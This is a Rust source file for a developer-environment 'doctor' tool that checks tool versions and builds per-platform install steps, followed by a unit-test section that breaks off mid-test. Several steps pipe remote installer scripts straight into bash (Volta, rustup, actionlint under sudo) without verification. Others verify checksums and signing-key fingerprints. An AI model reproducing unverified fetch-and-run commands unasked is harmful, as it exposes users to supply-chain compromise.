//! Port of `apps/rhino-cli/internal/doctor/tools.go`.
//!
//! Defines [`ToolDef`] (the per-tool check configuration) and
//! [`build_tool_defs`] (the ordered list of all known tools), together with
//! their install-step factories and version readers.

use std::path::{Path, PathBuf};

use crate::application::repo_config;

use super::ToolStatus;
use super::checker::{
    compare_exact, compare_gte, compare_major_gte, compare_playwright, parse_actionlint_version,
    parse_cargo_llvm_cov, parse_clang_format_version, parse_docker_version, parse_dotnet_version,
    parse_hadolint_version, parse_jq_version, parse_line_word, parse_playwright_version,
    parse_rust_version, parse_shellcheck_version, parse_trim_version, read_dotnet_version,
    read_node_version, read_npm_version, read_rust_toolchain_channel,
};

/// A single step in an auto-install sequence.
pub struct InstallStep {
    /// Short description shown to the user (e.g. `"Install Node.js 24.11.1 via Volta"`).
    pub description: String,
    /// Command to run (e.g. `"volta"`).
    pub command: String,
    /// Arguments passed to `command`.
    pub args: Vec<String>,
}

/// Function pointer that returns platform-specific install steps.
///
/// `required` is the version string from the project config; `platform` is
/// `"darwin"`, `"linux"`, or another `std::env::consts::OS` value.
/// Returns an empty `Vec` when auto-install is not supported on `platform`.
pub type InstallFunc = fn(required: &str, platform: &str) -> Vec<InstallStep>;

/// Complete specification for checking one tool.
pub struct ToolDef {
    /// Human-readable name (e.g. `"node"`).
    pub name: String,
    /// Executable name passed to the runner (e.g. `"node"`, `"rustc"`).
    pub binary: String,
    /// Config file that provides the required version (for display only).
    pub source: String,
    /// Arguments appended to `binary` when querying the installed version.
    pub args: Vec<String>,
    /// When `true`, version information is parsed from stderr instead of stdout.
    pub use_stderr: bool,
    /// Extracts the version string from raw command output.
    pub parse_ver: fn(&str) -> String,
    /// Compares the installed and required versions and returns a status + note.
    pub compare: fn(&str, &str) -> (ToolStatus, String),
    /// Reads the required version from the project config.
    pub read_req: fn() -> String,
    /// Optional install function; `None` means auto-install is unavailable.
    pub install_cmd: Option<InstallFunc>,
}

// --- ToolDef builders ---

/// Returns an empty string indicating no version requirement for this tool.
fn no_req() -> String {
    String::new()
}

/// Extracts the Git version from `git --version` output
/// (e.g. `"git version 2.42.0"`).
fn parse_git_version(s: &str) -> String {
    parse_line_word(s, "git version ", 2, "")
}

/// Extracts the `OpenTofu` version from `tofu --version` output
/// (e.g. `` `OpenTofu v1.10.2\non darwin_arm64` `` → `"1.10.2"`).
fn parse_tofu_version(s: &str) -> String {
    parse_line_word(s, "OpenTofu ", 1, "v")
}

/// Exact `OpenTofu` version installed by the macOS and Linux doctor bootstrappers.
const OPENTOFU_VERSION: &str = "1.12.3";

/// Immutable official `OpenTofu` release path for the security-cleared version.
const OPENTOFU_RELEASE_BASE_URL: &str =
    "https://github.com/opentofu/opentofu/releases/download/v1.12.3";

/// SHA-256 sum for the official macOS AMD64 archive.
const OPENTOFU_DARWIN_AMD64_SHA256: &str =
    "0898350dcc5b2ae31ad104cf4882228d08f858ba28f4e8bea693b51d1b267c57";
/// SHA-256 sum for the official macOS ARM64 archive.
const OPENTOFU_DARWIN_ARM64_SHA256: &str =
    "2b81c065cdcf5e573cfb5d9e0c663ac4cfc32512927078b645b58ef81cec2474";
/// SHA-256 sum for the official Linux AMD64 archive.
const OPENTOFU_LINUX_AMD64_SHA256: &str =
    "46b48c3438c65cf479fc076c9281422ffa2f493548d1e813d154c835c5986a08";
/// SHA-256 sum for the official Linux ARM64 archive.
const OPENTOFU_LINUX_ARM64_SHA256: &str =
    "b2110d1ce46e366ce861b7f53d293dad99080075629aed7fb50d7328916d91c2";

/// Returns the security-cleared minimum `OpenTofu` version for Doctor.
fn read_tofu_version() -> String {
    OPENTOFU_VERSION.into()
}

// Per-binary readers using a path captured in a static OnceLock.
// Go's closures capture repo_root; in Rust we precompute paths and stash them via static
// once-locks keyed off PID-stable build_tool_defs(repo_root) call.
use std::sync::OnceLock;

/// Process-wide cached collection of config-file paths derived from the repo root.
static PATHS: OnceLock<Paths> = OnceLock::new();

/// Pre-computed absolute paths to project config files used by version readers.
struct Paths {
    /// Path to the root `package.json` (for `volta.node` / `volta.npm`).
    package_json: PathBuf,
    /// Path to the repository's backend `global.json` (for .NET `sdk.version`).
    global_json: PathBuf,
    /// Path to `apps/rhino-cli/rust-toolchain.toml` (for the pinned `channel`).
    rust_toolchain_toml: PathBuf,
}

/// Initialises [`PATHS`] from `repo_root`.
///
/// The [`OnceLock`] guarantees only the first call has any effect; subsequent
/// calls with a different root are silently ignored.
fn set_paths(repo_root: &Path) {
    let p = Paths {
        package_json: repo_root.join("package.json"),
        global_json: configured_dotnet_global_json(repo_root),
        rust_toolchain_toml: repo_root
            .join("apps")
            .join("rhino-cli")
            .join("rust-toolchain.toml"),
    };
    // OnceLock — only the first writer wins. For tests we reset via reset_paths.
    let _ = PATHS.set(p);
}

/// Resolves the repository's .NET SDK configuration path from `repo-config.yml`.
///
/// Repositories without an explicit setting use the conventional root-level
/// `global.json`; repositories that keep it elsewhere declare that relative
/// path under `doctor.dotnet-global-json`.
fn configured_dotnet_global_json(repo_root: &Path) -> PathBuf {
    let configured = repo_config::load_or_default(repo_root)
        .doctor
        .dotnet_global_json;
    configured
        .as_deref()
        .map(|path| repo_config::confined_repo_path(repo_root, path))
        .transpose()
        // `repo-config validate` names invalid configuration precisely. Doctor
        // must nevertheless never follow an unsafe configured path when it is
        // invoked independently, so it falls back to the conventional root
        // file rather than traversing an absolute, parent, or symlink escape.
        .unwrap_or(None)
        .unwrap_or_else(|| repo_root.join("global.json"))
}

/// Returns a reference to the global [`Paths`] instance.
///
/// # Panics
///
/// Panics when [`set_paths`] has not been called (i.e. [`PATHS`] is still
/// uninitialised), which should never happen in normal usage because
/// [`build_tool_defs`] always calls [`set_paths`] first.
fn p() -> &'static Paths {
    PATHS.get().expect("PATHS not initialized")
}

/// Reads the `node` version from the cached `package.json`.
fn read_node_v() -> String {
    read_node_version(&p().package_json).unwrap_or_default()
}
/// Reads the `npm` version from the cached `package.json`.
fn read_npm_v() -> String {
    read_npm_version(&p().package_json).unwrap_or_default()
}
/// Reads the .NET SDK version from the cached `global.json`.
fn read_dotnet_v() -> String {
    read_dotnet_version(&p().global_json).unwrap_or_default()
}
/// Reads the pinned toolchain `channel` from the cached `rust-toolchain.toml`.
fn read_rust_toolchain_v() -> String {
    read_rust_toolchain_channel(&p().rust_toolchain_toml).unwrap_or_default()
}

// --- Install commands ---

/// Returns install steps for `git`.
///
/// On macOS: `xcode-select --install`.
/// On Linux: `sudo apt-get install -y git`.
fn install_git(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install Xcode Command Line Tools".into(),
            command: "xcode-select".into(),
            args: vec!["--install".into()],
        }]
    } else {
        vec![InstallStep {
            description: "Install git".into(),
            command: "sudo".into(),
            args: vec![
                "apt-get".into(),
                "install".into(),
                "-y".into(),
                "git".into(),
            ],
        }]
    }
}

/// Returns install steps for Volta (the Node.js version manager).
fn install_volta(_req: &str, _platform: &str) -> Vec<InstallStep> {
    vec![InstallStep {
        description: "Install Volta".into(),
        command: "bash".into(),
        args: vec!["-c".into(), "curl https://get.volta.sh | bash".into()],
    }]
}

/// Returns install steps for Node.js via `volta install node@<req>`.
fn install_node(req: &str, _platform: &str) -> Vec<InstallStep> {
    vec![InstallStep {
        description: format!("Install Node.js {req} via Volta"),
        command: "volta".into(),
        args: vec!["install".into(), format!("node@{req}")],
    }]
}

/// Returns install steps for npm via `volta install npm@<req>`.
fn install_npm(req: &str, _platform: &str) -> Vec<InstallStep> {
    vec![InstallStep {
        description: format!("Install npm {req} via Volta"),
        command: "volta".into(),
        args: vec!["install".into(), format!("npm@{req}")],
    }]
}

/// Returns install steps for Rust via `rustup`.
fn install_rust(_req: &str, _platform: &str) -> Vec<InstallStep> {
    vec![InstallStep {
        description: "Install Rust via rustup".into(),
        command: "bash".into(),
        args: vec![
            "-c".into(),
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y".into(),
        ],
    }]
}

/// Returns install steps for `cargo-llvm-cov` via `cargo install`.
fn install_cargo_llvm_cov(_req: &str, _platform: &str) -> Vec<InstallStep> {
    vec![InstallStep {
        description: "Install cargo-llvm-cov".into(),
        command: "bash".into(),
        args: vec![
            "-c".into(),
            "source \"$HOME/.cargo/env\" && cargo install cargo-llvm-cov".into(),
        ],
    }]
}

/// Well-known .NET release channel used when [`dotnet_channel`] cannot
/// derive one from the configured requirement (e.g. an empty `req`).
const DOTNET_DEFAULT_CHANNEL: &str = "10.0";

/// Extracts the `major.minor` release channel (e.g. `"10.0"`) from a full
/// SDK version string (e.g. `"10.0.204"`), for use with the .NET official
/// install script's `--channel` flag.
///
/// Falls back to [`DOTNET_DEFAULT_CHANNEL`] when `req` is empty, does not
/// contain at least two dot-separated, non-empty segments, or when either
/// segment contains anything other than ASCII digits. The digit-only
/// restriction is a security boundary, not cosmetic: the returned string is
/// spliced verbatim into a `bash -c` script in [`install_dotnet`], and `req`
/// originates from `global.json`'s `sdk.version`, an unvalidated config
/// value. Rejecting any non-digit character (including `.`, `;`, `|`, `` ` ``,
/// `$`, whitespace) before that splice closes the shell-metacharacter
/// injection path rather than merely narrowing it.
fn dotnet_channel(req: &str) -> String {
    let mut parts = req.split('.');
    match (parts.next(), parts.next()) {
        (Some(major), Some(minor))
            if !major.is_empty()
                && !minor.is_empty()
                && major.bytes().all(|b| b.is_ascii_digit())
                && minor.bytes().all(|b| b.is_ascii_digit()) =>
        {
            format!("{major}.{minor}")
        }
        _ => DOTNET_DEFAULT_CHANNEL.into(),
    }
}

/// GPG key fingerprint (40 hex chars) that must sign `dotnet-install.sh`,
/// pinned from Microsoft's published key at `https://dot.net/v1/dotnet-install.asc`
/// (live-verified 2026-08-07: key `B9CF1A51FC7D3ACF`, uid "Microsoft
/// `DevUXTeamPrague` <devuxteamprague@microsoft.com>", detached signature at
/// `https://dot.net/v1/dotnet-install.sig` verifies against the fetched
/// script). Pinning the fingerprint — rather than trusting whatever key the
/// `.asc` endpoint happens to serve at install time — closes the same class
/// of gap `OPENTOFU_*_SHA256` closes for `install_tofu`: without a pin, a
/// compromised `dot.net` endpoint could serve a malicious script alongside a
/// matching malicious key/signature pair and still pass verification.
const DOTNET_INSTALL_SH_GPG_FINGERPRINT: &str = "2B930AB1228D11D5D7F6B6ACB9CF1A51FC7D3ACF";

/// Returns install steps for .NET SDK.
///
/// On macOS: `brew install dotnet`.
/// On Linux: Microsoft's official `dotnet-install.sh` script, channelled to
/// the required SDK's `major.minor` version. The community-maintained
/// `dotnet-sdk` snap is deliberately avoided — its track catalog lags
/// behind current .NET releases (capped at `8.0/stable` as of 2026-08),
/// so a hardcoded newer channel there fails to install on every CI run.
///
/// The Linux command is:
///
/// ```text
/// curl -fsSL https://dot.net/v1/dotnet-install.sh -o "$temp_dir/dotnet-install.sh"
/// # + .sig/.asc download and GPG signature verification (see
/// #   DOTNET_INSTALL_SH_GPG_FINGERPRINT)
/// sudo mkdir -p /usr/share/dotnet
/// sudo chown "$(id -u):$(id -g)" /usr/share/dotnet
/// bash "$temp_dir/dotnet-install.sh" --channel <channel> --install-dir /usr/share/dotnet
/// sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet
/// ```
///
/// Only the directory creation is privileged, not the whole script: `sudo`
/// scope is narrowed to `mkdir`/`chown`/`ln` because `/usr/share` is
/// root-owned on stock Debian/Ubuntu, so creating `/usr/share/dotnet` needs
/// root — but Microsoft's install script itself is designed to perform a
/// non-admin installation once its target directory exists and is writable,
/// and its own writes (extraction, SDK files) stay confined to
/// `--install-dir` and its own `mktemp` working directory. Running the
/// entire curl-downloaded third-party script under `sudo`, as an earlier
/// version of this function did, would escalate every one of those writes to
/// root for no reason beyond the single `mkdir` that actually requires it.
fn install_dotnet(req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install .NET via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "dotnet".into()],
        }]
    } else {
        let channel = dotnet_channel(req);
        vec![InstallStep {
            description: format!("Install .NET {channel} via the official install script"),
            command: "bash".into(),
            args: vec![
                "-c".into(),
                format!(
                    r#"set -eu
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT
curl --proto '=https' --tlsv1.2 -fsSL https://dot.net/v1/dotnet-install.sh -o "$temp_dir/dotnet-install.sh"
curl --proto '=https' --tlsv1.2 -fsSL https://dot.net/v1/dotnet-install.sig -o "$temp_dir/dotnet-install.sig"
curl --proto '=https' --tlsv1.2 -fsSL https://dot.net/v1/dotnet-install.asc -o "$temp_dir/dotnet-install.asc"
export GNUPGHOME="$temp_dir/gnupg"
mkdir -m 700 "$GNUPGHOME"
gpg --batch --import "$temp_dir/dotnet-install.asc" >/dev/null 2>&1
actual_fingerprint=$(gpg --batch --with-colons --fingerprint | awk -F: '/^fpr:/ {{print $10; exit}}')
if [ "$actual_fingerprint" != "{DOTNET_INSTALL_SH_GPG_FINGERPRINT}" ]; then
  echo "dotnet-install.sh signing key fingerprint mismatch: expected {DOTNET_INSTALL_SH_GPG_FINGERPRINT}, got $actual_fingerprint" >&2
  exit 1
fi
gpg --batch --verify "$temp_dir/dotnet-install.sig" "$temp_dir/dotnet-install.sh"
sudo mkdir -p /usr/share/dotnet
sudo chown "$(id -u):$(id -g)" /usr/share/dotnet
bash "$temp_dir/dotnet-install.sh" --channel {channel} --install-dir /usr/share/dotnet
sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet"#
                ),
            ],
        }]
    }
}

/// Returns install steps for Docker.
///
/// On macOS: returns an empty `Vec` (Docker Desktop must be installed manually).
/// On Linux: `sudo apt-get install -y docker.io docker-compose-v2`.
fn install_docker(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        // Docker Desktop must be installed manually on macOS.
        Vec::new()
    } else {
        vec![InstallStep {
            description: "Install Docker".into(),
            command: "sudo".into(),
            args: vec![
                "apt-get".into(),
                "install".into(),
                "-y".into(),
                "docker.io".into(),
                "docker-compose-v2".into(),
            ],
        }]
    }
}

/// Returns install steps for `jq`.
///
/// On macOS: `brew install jq`.
/// On Linux: `sudo apt-get install -y jq`.
fn install_jq(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install jq via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "jq".into()],
        }]
    } else {
        vec![InstallStep {
            description: "Install jq".into(),
            command: "sudo".into(),
            args: vec!["apt-get".into(), "install".into(), "-y".into(), "jq".into()],
        }]
    }
}

/// Returns install steps for `shellcheck` (Homebrew on macOS, apt otherwise).
fn install_shellcheck(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install shellcheck via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "shellcheck".into()],
        }]
    } else {
        vec![InstallStep {
            description: "Install shellcheck".into(),
            command: "sudo".into(),
            args: vec![
                "apt-get".into(),
                "install".into(),
                "-y".into(),
                "shellcheck".into(),
            ],
        }]
    }
}

/// Returns install steps for `actionlint` (Homebrew on macOS; pinned download
/// script on Linux, where no apt package is published).
fn install_actionlint(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install actionlint via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "actionlint".into()],
        }]
    } else {
        vec![InstallStep {
            description: "Install actionlint via the official download script".into(),
            command: "sudo".into(),
            args: vec![
                "bash".into(),
                "-c".into(),
                "curl -sSL https://raw.githubusercontent.com/rhysd/actionlint/v1.7.12/scripts/download-actionlint.bash | bash -s -- 1.7.12 /usr/local/bin".into(),
            ],
        }]
    }
}

/// Returns install steps for `hadolint` (Homebrew on macOS; pinned binary
/// download on Linux, where no apt package is published).
fn install_hadolint(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install hadolint via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "hadolint".into()],
        }]
    } else {
        vec![
            InstallStep {
                description: "Download hadolint binary".into(),
                command: "sudo".into(),
                args: vec![
                    "curl".into(),
                    "-sSL".into(),
                    "-o".into(),
                    "/usr/local/bin/hadolint".into(),
                    "https://github.com/hadolint/hadolint/releases/download/v2.14.0/hadolint-Linux-x86_64".into(),
                ],
            },
            InstallStep {
                description: "Make hadolint executable".into(),
                command: "sudo".into(),
                args: vec!["chmod".into(), "+x".into(), "/usr/local/bin/hadolint".into()],
            },
        ]
    }
}

/// Returns install steps for `shfmt` (Homebrew on macOS; pinned binary
/// download on Linux, where no apt package is published).
fn install_shfmt(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install shfmt via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "shfmt".into()],
        }]
    } else {
        vec![
            InstallStep {
                description: "Download shfmt binary".into(),
                command: "sudo".into(),
                args: vec![
                    "curl".into(),
                    "-sSL".into(),
                    "-o".into(),
                    "/usr/local/bin/shfmt".into(),
                    "https://github.com/mvdan/sh/releases/download/v3.13.1/shfmt_v3.13.1_linux_amd64".into(),
                ],
            },
            InstallStep {
                description: "Make shfmt executable".into(),
                command: "sudo".into(),
                args: vec!["chmod".into(), "+x".into(), "/usr/local/bin/shfmt".into()],
            },
        ]
    }
}

/// Returns install steps for `tofu` (`OpenTofu`).
///
/// On macOS and Linux: a pinned official release archive whose checksum is
/// authenticated against the hash committed alongside this installer. A release
/// archive is used directly rather than fetching and executing a mutable shell
/// script from the network.
fn install_tofu(_req: &str, platform: &str) -> Vec<InstallStep> {
    let (os, checksum_command, amd64_checksum, arm64_checksum) = match platform {
        "darwin" => (
            "darwin",
            "shasum -a 256",
            OPENTOFU_DARWIN_AMD64_SHA256,
            OPENTOFU_DARWIN_ARM64_SHA256,
        ),
        "linux" => (
            "linux",
            "sha256sum",
            OPENTOFU_LINUX_AMD64_SHA256,
            OPENTOFU_LINUX_ARM64_SHA256,
        ),
        _ => return Vec::new(),
    };

    vec![InstallStep {
        description: "Install verified OpenTofu release archive".into(),
        command: "bash".into(),
        args: vec![
            "-c".into(),
            format!(
                r#"set -eu
case "$(uname -m)" in
  x86_64) arch=amd64; expected_checksum={amd64_checksum} ;;
  arm64|aarch64) arch=arm64; expected_checksum={arm64_checksum} ;;
  *) echo "Unsupported OpenTofu architecture: $(uname -m)" >&2; exit 1 ;;
esac
artifact=tofu_{OPENTOFU_VERSION}_{os}_${{arch}}.zip
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT
curl --proto '=https' --tlsv1.2 -fsSL {OPENTOFU_RELEASE_BASE_URL}/"$artifact" -o "$temp_dir/$artifact"
actual_checksum=$({checksum_command} "$temp_dir/$artifact" | awk '{{print $1}}')
if [ "$actual_checksum" != "$expected_checksum" ]; then
  echo "OpenTofu archive checksum mismatch" >&2
  exit 1
fi
unzip -q "$temp_dir/$artifact" -d "$temp_dir/extract"
sudo install -m 0755 "$temp_dir/extract/tofu" /usr/local/bin/tofu"#
            ),
        ],
    }]
}

/// Returns install steps for `clang-format` (Homebrew on macOS, apt on Linux).
///
/// Uses the dedicated Homebrew formula / apt package rather than Xcode's
/// bundled copy: Xcode's `clang-format` binary is not on `PATH` and its
/// version is not pinned consistently across Xcode releases.
fn install_clang_format(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install clang-format via Homebrew".into(),
            command: "brew".into(),
            args: vec!["install".into(), "clang-format".into()],
        }]
    } else {
        vec![InstallStep {
            description: "Install clang-format".into(),
            command: "sudo".into(),
            args: vec![
                "apt-get".into(),
                "install".into(),
                "-y".into(),
                "clang-format".into(),
            ],
        }]
    }
}

/// Returns install steps for Playwright browsers.
///
/// On macOS: `npx playwright install`.
/// On Linux: `npx playwright install` followed by `npx playwright install-deps`.
fn install_playwright(_req: &str, platform: &str) -> Vec<InstallStep> {
    if platform == "darwin" {
        vec![InstallStep {
            description: "Install Playwright browsers".into(),
            command: "npx".into(),
            args: vec!["playwright".into(), "install".into()],
        }]
    } else {
        vec![
            InstallStep {
                description: "Install Playwright browsers".into(),
                command: "npx".into(),
                args: vec!["playwright".into(), "install".into()],
            },
            InstallStep {
                description: "Install Playwright system deps".into(),
                command: "npx".into(),
                args: vec!["playwright".into(), "install-deps".into()],
            },
        ]
    }
}

/// Build the ordered list of tool defs for the given repo root.
pub fn build_tool_defs(repo_root: &Path) -> Vec<ToolDef> {
    // PATHS is a OnceLock — only set once per process. Tests use isolated runners.
    set_paths(repo_root);
    let mut defs = tool_defs_core();
    defs.extend(tool_defs_rust());
    defs.extend(tool_defs_dotnet());
    defs.extend(tool_defs_infra());
    defs.extend(tool_defs_formatters());
    defs
}

/// Returns the core tool definitions: `git`, `volta`, `node`, `npm`.
fn tool_defs_core() -> Vec<ToolDef> {
    vec![
        ToolDef {
            name: "git".into(),
            binary: "git".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_git_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_git),
        },
        ToolDef {
            name: "volta".into(),
            binary: "volta".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_trim_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_volta),
        },
        ToolDef {
            name: "node".into(),
            binary: "node".into(),
            source: "package.json → volta.node".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_trim_version,
            compare: compare_exact,
            read_req: read_node_v,
            install_cmd: Some(install_node),
        },
        ToolDef {
            name: "npm".into(),
            binary: "npm".into(),
            source: "package.json → volta.npm".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_trim_version,
            compare: compare_exact,
            read_req: read_npm_v,
            install_cmd: Some(install_npm),
        },
    ]
}

/// Returns tool definitions for Rust: `rust`, `cargo-llvm-cov`.
fn tool_defs_rust() -> Vec<ToolDef> {
    vec![
        ToolDef {
            name: "rust".into(),
            binary: "rustc".into(),
            source: "apps/rhino-cli/rust-toolchain.toml → channel".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_rust_version,
            compare: compare_exact,
            read_req: read_rust_toolchain_v,
            install_cmd: Some(install_rust),
        },
        ToolDef {
            name: "cargo-llvm-cov".into(),
            binary: "cargo".into(),
            source: "(no config file)".into(),
            args: vec!["llvm-cov".into(), "--version".into()],
            use_stderr: false,
            parse_ver: parse_cargo_llvm_cov,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_cargo_llvm_cov),
        },
    ]
}

/// Returns tool definitions for .NET: `dotnet`.
fn tool_defs_dotnet() -> Vec<ToolDef> {
    vec![ToolDef {
        name: "dotnet".into(),
        binary: "dotnet".into(),
        source: "doctor.dotnet-global-json → sdk.version".into(),
        args: vec!["--version".into()],
        use_stderr: false,
        parse_ver: parse_dotnet_version,
        compare: compare_major_gte,
        read_req: read_dotnet_v,
        install_cmd: Some(install_dotnet),
    }]
}

/// Returns tool definitions for infrastructure: `docker`, `jq`,
/// `shellcheck`, `hadolint`, `actionlint`, `playwright`.
fn tool_defs_infra() -> Vec<ToolDef> {
    vec![
        ToolDef {
            name: "docker".into(),
            binary: "docker".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_docker_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_docker),
        },
        ToolDef {
            name: "jq".into(),
            binary: "jq".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_jq_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_jq),
        },
        ToolDef {
            name: "shellcheck".into(),
            binary: "shellcheck".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_shellcheck_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_shellcheck),
        },
        ToolDef {
            name: "hadolint".into(),
            binary: "hadolint".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_hadolint_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_hadolint),
        },
        ToolDef {
            name: "actionlint".into(),
            binary: "actionlint".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_actionlint_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_actionlint),
        },
        ToolDef {
            name: "playwright".into(),
            binary: "npx".into(),
            source: "node_modules (npx playwright)".into(),
            args: vec!["playwright".into(), "--version".into()],
            use_stderr: false,
            parse_ver: parse_playwright_version,
            compare: compare_playwright,
            read_req: no_req,
            install_cmd: Some(install_playwright),
        },
    ]
}

/// Returns tool definitions for formatters invoked from lint-staged:
/// `shfmt`, `tofu`, `clang-format`.
fn tool_defs_formatters() -> Vec<ToolDef> {
    vec![
        ToolDef {
            name: "shfmt".into(),
            binary: "shfmt".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_trim_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_shfmt),
        },
        ToolDef {
            name: "tofu".into(),
            binary: "tofu".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_tofu_version,
            compare: compare_gte,
            read_req: read_tofu_version,
            install_cmd: Some(install_tofu),
        },
        ToolDef {
            name: "clang-format".into(),
            binary: "clang-format".into(),
            source: "(no config file)".into(),
            args: vec!["--version".into()],
            use_stderr: false,
            parse_ver: parse_clang_format_version,
            compare: compare_exact,
            read_req: no_req,
            install_cmd: Some(install_clang_format),
        },
    ]
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::panic)]
mod tests {
    use super::*;

    #[test]
    fn build_returns_all_known_tools() {
        let dir = tempfile::tempdir().unwrap();
        let defs = build_tool_defs(dir.path());
        assert_eq!(defs.len(), 16);
        assert_eq!(defs[0].name, "git");
        assert_eq!(defs.last().unwrap().name, "clang-format");
        assert!(defs.iter().any(|d| d.name == "shellcheck"));
        assert!(defs.iter().any(|d| d.name == "hadolint"));
        assert!(defs.iter().any(|d| d.name == "actionlint"));
        assert!(defs.iter().any(|d| d.name == "playwright"));
    }

    #[test]
    fn build_returns_shfmt() {
        let dir = tempfile::tempdir().unwrap();
        let defs = build_tool_defs(dir.path());
        assert!(defs.iter().any(|d| d.name == "shfmt"));
    }

    #[test]
    fn build_returns_tofu() {
        let dir = tempfile::tempdir().unwrap();
        let defs = build_tool_defs(dir.path());
        assert!(defs.iter().any(|d| d.name == "tofu"));
    }

    #[test]
    fn build_returns_clang_format() {
        let dir = tempfile::tempdir().unwrap();
        let defs = build_tool_defs(dir.path());
        assert!(defs.iter().any(|d| d.name == "clang-format"));
    }

    #[test]
    fn install_git_macos() {
        let steps = install_git("", "darwin");
        assert_eq!(steps[0].command, "xcode-select");
    }

    #[test]
    fn install_git_linux() {
        let steps = install_git("", "linux");
        assert_eq!(steps[0].command, "sudo");
        assert!(steps[0].args.contains(&"git".to_string()));
    }

    #[test]
    fn install_docker_macos_empty() {
        assert!(install_docker("", "darwin").is_empty());
    }

    #[test]
    fn install_node_formats_required() {
        let s = install_node("24.11.1", "darwin");
        assert_eq!(s[0].args[1], "node@24.11.1");
    }

    #[test]
    fn install_shfmt_macos() {
        let steps = install_shfmt("", "darwin");
        assert_eq!(steps[0].command, "brew");
        assert!(steps[0].args.contains(&"shfmt".to_string()));
    }

    #[test]
    fn install_shfmt_linux() {
        let steps = install_shfmt("", "linux");
        assert_eq!(steps[0].command, "sudo");
        assert!(steps[0].args.iter().any(|a| a.contains("shfmt")));
        assert_eq!(steps[1].command, "sudo");
        assert!(steps[1].args.contains(&"/usr/local/bin/shfmt".to_string()));
    }

    #[test]
    fn install_tofu_macos() {
        let steps = install_tofu("", "darwin");
        let linux_steps = install_tofu("", "linux");
        let script = &steps[0].args[1];

        assert_eq!(steps[0].command, "bash");
        assert_eq!(OPENTOFU_VERSION, "1.12.3");
        assert!(script.contains("github.com/opentofu/opentofu/releases/download/v1.12.3"));
        assert!(script.contains("tofu_1.12.3_darwin_"));
        assert!(
            script.contains("0898350dcc5b2ae31ad104cf4882228d08f858ba28f4e8bea693b51d1b267c57")
        );
        assert!(
            script.contains("2b81c065cdcf5e573cfb5d9e0c663ac4cfc32512927078b645b58ef81cec2474")
        );
        assert!(script.contains("shasum -a 256"));
        assert!(script.contains("unzip -q"));
        assert!(
            script.find("actual_checksum=").unwrap() < script.find("unzip -q").unwrap(),
            "the archive must be authenticated before it is unpacked"
        );
        assert!(!script.contains("install-opentofu.sh"));
        assert_ne!(steps[0].args, linux_steps[0].args);
    }

    #[test]
    fn install_tofu_linux() {
        let steps = install_tofu("", "linux");
        assert_eq!(steps[0].command, "bash");
        assert_eq!(OPENTOFU_VERSION, "1.12.3");
        let script = &steps[0].args[1];
        assert!(script.contains("github.com/opentofu/opentofu/releases/download/v1.12.3"));
        assert!(script.contains("tofu_1.12.3_linux_"));
        assert!(
            script.contains("46b48c3438c65cf479fc076c9281422ffa2f493548d1e813d154c835c5986a08")
        );
        assert!(
            script.contains("b2110d1ce46e366ce861b7f53d293dad99080075629aed7fb50d7328916d91c2")
        );
        assert!(script.contains("sha256sum"));
        assert!(script.contains("unzip -q"));
        assert!(
            script.find("actual_checksum=").unwrap() < script.find("unzip -q").unwrap(),
            "the archive must be authenticated before it is unpacked"
        );
        assert!(script.contains("--tlsv1.2"));
        assert!(!script.contains("latest"));
